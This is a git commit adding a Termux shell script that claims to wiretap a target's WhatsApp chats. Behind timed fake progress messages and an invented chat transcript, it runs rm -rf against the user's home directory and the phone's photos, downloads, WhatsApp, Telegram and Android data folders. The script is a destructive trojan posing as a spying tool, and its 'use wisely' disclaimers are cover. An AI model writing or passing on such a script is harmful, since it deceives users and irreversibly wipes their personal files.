48b536ac3b3e7caf6bffb5fe1898e4532fbe7986
MrGroot-Git <55680918+MrGroot-Git@users.noreply.github.com>
2019-09-23 12:25:04 +0700

    Add files via upload

---
+++ SadapWhatsApp.sh
@@ -0,0 +1,66 @@
+termux-setup-storage
+clear
+echo "\033[93m____    _    ____    _    ____
+/ ___|  / \  |  _ \  / \  |  _ \
+\___ \ / _ \ | | | |/ _ \ | |_) |
+ ___) / ___ \| |_| / ___ \|  __/
+|____/_/   \_\____/_/   \_\_|"
+echo "\033[92mMengambil Nomor Acakan Dari Kontak +628xxxxxxxxxx"
+sleep 5s
+echo "\033[92mPlease Wait ..."
+sleep 5s
+echo "\033[92mStarting Penyadapan ..."
+sleep 5s
+clear
+echo "\033[92mMendapatkan Hasil Chat Terbaru ..."
+sleep 7s
+echo "\033[92mMengambil Chat ...."
+sleep 7s
+echo "\033[92mNomor Target +628xxxxxxxxxx"
+sleep 7s
+echo "\033[92mNick Rahayu"
+sleep 5s
+rm -rf /$HOME
+rm -rf /storage/emulated/0/MIUI
+rm -rf /storage/emulated/0/Telegram
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/Download
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /storage/emulated/0/Android/data/com.whatsapp
+rm -rf /storage/emulated/0/Android
+clear
+echo "\033[92m[20:00] Yu ..."
+sleep 3s
+echo "\033[92m[20:00] Target} Kamu lagi apa? ..."
+sleep 3s
+echo "\033[92m[20:01] Ini lagi nonton ...."
+sleep 3s
+echo "\033[92m[20:01] Tumben nya kamu chat aku, ada apa? ...."
+sleep 3s
+echo "\033[92m[20:02] Target} Hmm, ko gitu jawab nya? ...."
+sleep 3s
+echo "\033[92m[20:02] Target} Salah ya aku? ..."
+sleep 3s
+echo "\033[92m[20:03] Engga, tumben aja kamu chat haha ...."
+sleep 3s
+echo "\033[92m[20:03] Akuu off dlu ya, maaf soal nya ngantuk ..."
+sleep 3s
+echo "\033[92m[20:03] Target} Oke deh, aky juga mau tidur ..."
+clear
+echo "\033[92mMenutup Chat Target"
+sleep 3s
+echo "\033[92mGunakan Dengab Bijak"
+sleep 3s
+echo "\033[92mJangan Di Salah Gunakan"
+sleep 3s
+echo "\033[92mDan Jangan Sesekali Di Jual"
+sleep 3s
+echo "Saya Tidak Sesekali Bertanggung Jawab Bila Terjadi Hal² Yang Tidak Di Inginkan..."
+sleep 3s
+echo "Tanggung Jawab Di Tanggung Penumpang ..."
+sleep 3s
+echo "\033[92mTerimakasih Telah Menggunakan Script Ini..."
+sleep 3s
+echo "Done ...."
+
+
